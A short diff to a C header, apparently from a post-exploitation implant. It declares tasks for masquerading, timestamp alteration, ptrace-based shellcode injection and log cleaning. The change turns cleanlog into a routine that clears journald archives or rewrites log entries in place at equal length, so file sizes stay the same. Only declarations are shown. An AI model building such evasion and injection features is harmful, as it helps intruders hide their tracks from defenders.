@@ -12,8 +12,9 @@ int task_masquerade(const uint8_t *data, uint32_t len, mp_writer_t *w);
 /// timestomp — modify file timestamps
 int task_timestomp(const uint8_t *data, uint32_t len, mp_writer_t *w);
 
-/// cleanlog — truncate system logs (requires root)
-int task_cleanlog(mp_writer_t *w);
+/// cleanlog — 日志处理：默认安全清理（auditd 判定 + journald 轮转清归档），
+///            可选 path+pairs 走**等长就地改写**（文件大小零变化）
+int task_cleanlog(const uint8_t *data, uint32_t len, mp_writer_t *w);
 
 /// inject — ptrace-based shellcode injection
 int task_inject(const uint8_t *data, uint32_t len, mp_writer_t *w);
